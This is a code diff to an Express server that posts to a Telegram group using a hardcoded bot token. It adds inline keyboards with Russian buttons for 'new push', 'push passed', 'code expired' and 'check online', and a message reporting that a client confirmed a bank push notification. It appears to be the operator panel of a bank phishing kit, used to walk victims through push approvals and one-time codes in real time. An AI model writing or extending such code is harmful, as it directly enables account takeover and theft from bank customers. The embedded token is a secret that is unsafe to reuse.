@@ -8,6 +8,7 @@ const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
 
+
 const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
 const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();
 
@@ -20,6 +21,7 @@ const TIMEOUT_MS = 10 * 60 * 1000;
 const pending = new Map();
 
 const lastSeen = new Map();
+
 
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
@@ -78,10 +80,26 @@ function codeKeyboard(request_id) {
       ],
       [
         { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
-        { text: "📲 Новый пуш",        callback_data: `${request_id}:push_code`    },
       ],
       [
         { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
+      ],
+    ],
+  };
+}
+
+function pushKeyboard(request_id) {
+  return {
+    inline_keyboard: [
+      [
+        { text: "✅ Пуш прошёл",        callback_data: `${request_id}:ok`          },
+        { text: "📲 Новый пуш",          callback_data: `${request_id}:push`        },
+      ],
+      [
+        { text: "💬 Перейти к коду",     callback_data: `${request_id}:push_code`   },
+      ],
+      [
+        { text: "👁 Проверка онлайна",   callback_data: `${request_id}:check_online` },
       ],
     ],
   };
@@ -220,7 +238,7 @@ app.post("/api/push_approved", async (req, res) => {
     await tgPost("sendMessage", {
       chat_id: GROUP_CHAT_ID,
       text: `✅ Клиент подтвердил пуш-уведомление в банке\n🆔 Заявка: ${request_id}`,
-      reply_markup: codeKeyboard(request_id),
+      reply_markup: pushKeyboard(request_id),
     });
   } catch (err) {
     console.error("[push_approved] Telegram error:", err.message);
